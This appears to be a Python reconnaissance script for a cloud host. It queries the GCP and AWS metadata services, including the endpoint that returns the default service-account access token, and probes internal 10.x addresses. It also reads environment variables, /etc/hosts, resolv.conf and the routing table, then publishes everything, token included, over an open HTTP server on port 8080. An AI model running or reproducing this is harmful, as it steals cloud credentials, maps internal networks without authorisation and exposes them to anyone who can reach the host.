import http.server
import urllib.request
import json
import os
import socket
import ssl

results = {}

def probe(name, url, timeout=3, headers=None):
    try:
        req = urllib.request.Request(url)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        data = resp.read().decode('utf-8', errors='replace')
        results[name] = {"status": resp.status, "data": data[:2000]}
    except Exception as e:
        results[name] = {"error": str(e)}

# Probe GCP metadata
probe("metadata_v4", "http://169.254.169.254/computeMetadata/v1/?recursive=true", 
      headers={"Metadata-Flavor": "Google"})
probe("metadata_v4_noheader", "http://169.254.169.254/computeMetadata/v1/")
probe("metadata_aws_style", "http://169.254.169.254/latest/meta-data/")
probe("metadata_dns", "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
      headers={"Metadata-Flavor": "Google"})

# Network info
try:
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    results["network"] = {
        "hostname": hostname,
        "local_ip": local_ip,
        "all_ips": [addr[4][0] for addr in socket.getaddrinfo(hostname, None)]
    }
except Exception as e:
    results["network"] = {"error": str(e)}

# Probe internal services
probe("internal_10_128_0_1", "http://10.128.0.1:80/", timeout=2)
probe("internal_10_132_0_1", "http://10.132.0.1:80/", timeout=2)
probe("localhost_80", "http://127.0.0.1:80/", timeout=2)

# Environment variables (filter sensitive)
results["env"] = {k: v for k, v in os.environ.items() 
                  if not any(s in k.lower() for s in ['password', 'secret', 'key', 'token', 'credential'])}

# Read /etc/resolv.conf for DNS config
try:
    with open('/etc/resolv.conf') as f:
        results["resolv_conf"] = f.read()
except Exception as e:
    results["resolv_conf"] = str(e)

# Read /etc/hosts
try:
    with open('/etc/hosts') as f:
        results["hosts"] = f.read()
except Exception as e:
    results["hosts"] = str(e)

# Check route table
try:
    import subprocess
    r = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=2)
    results["routes"] = r.stdout
except Exception as e:
    results["routes"] = str(e)

# Try reading cloud identity
probe("gcp_identity", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
      headers={"Metadata-Flavor": "Google"})

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2).encode())

print(f"Probe results: {json.dumps({k: 'ok' if 'data' in v else v.get('error','?')[:50] for k,v in results.items() if isinstance(v, dict)}, indent=2)}")
print("Starting server on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
